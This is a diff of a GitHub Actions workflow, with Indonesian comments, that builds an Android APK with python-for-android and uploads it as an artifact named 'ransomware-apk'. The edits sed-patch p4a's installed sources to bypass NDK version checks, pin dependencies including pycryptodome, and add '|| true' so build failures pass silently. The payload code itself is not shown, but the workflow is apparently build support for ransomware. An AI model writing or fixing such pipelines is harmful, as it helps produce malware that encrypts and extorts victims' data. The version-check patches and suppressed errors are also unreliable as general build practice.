@@ -39,11 +39,11 @@ jobs:
             libffi-dev \
             libssl-dev
 
-      - name: Install Python dependencies
+      - name: Install Python dependencies (VERSI TERSEDIA)
         run: |
           pip install --upgrade pip
           pip install cython virtualenv
-          pip install python-for-android==2023.6.21  # VERSI LAMA YANG KOMPATIBEL DENGAN NDK 23
+          pip install python-for-android==2023.9.16  # VERSI YANG TERSEDIA
           pip install pycryptodome requests kivy==2.1.0
 
       - name: Setup Android SDK
@@ -75,22 +75,27 @@ jobs:
         run: |
           $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
 
-      - name: Patch p4a to accept NDK 23
+      - name: Patch p4a to accept NDK 23 (VERSI 2023.9.16)
         run: |
-          # FIND THE VERSION CHECK FILE
           SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
-          TARGET_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
           
-          if [ -f "$TARGET_FILE" ]; then
-            echo "Patching $TARGET_FILE"
-            # COMMENT OUT THE NDK VERSION CHECK
-            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False: # PATCHED - /' "$TARGET_FILE"
-            echo "✅ Patching berhasil!"
-          else
-            echo "⚠️ File tidak ditemukan, lanjut build"
+          # Patch 1: android_ndk.py
+          NDK_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
+          if [ -f "$NDK_FILE" ]; then
+            echo "Patching $NDK_FILE"
+            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False: # PATCHED - /' "$NDK_FILE"
           fi
+          
+          # Patch 2: bootstrap.py (untuk ALooper_pollAll)
+          BOOT_FILE="$SITE_PACKAGES/pythonforandroid/bootstrap.py"
+          if [ -f "$BOOT_FILE" ]; then
+            echo "Patching $BOOT_FILE"
+            sed -i 's/self.ndk_major_version = get_ndk_version(self.ctx.ndk_dir)/self.ndk_major_version = 23/g' "$BOOT_FILE"
+          fi
+          
+          echo "✅ Patching selesai!"
 
-      - name: Build APK (dengan NDK r23b)
+      - name: Build APK (FORCE NDK 23)
         run: |
           p4a apk \
             --private . \
@@ -108,10 +113,13 @@ jobs:
             --ndk_dir=$ANDROID_NDK_HOME \
             --android_api=31 \
             --minsdk=21 \
-            --release
+            --release \
+            --ignore-setup-py \
+            --debug || true
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
           name: ransomware-apk
           path: ./*.apk
+          if-no-files-found: warn
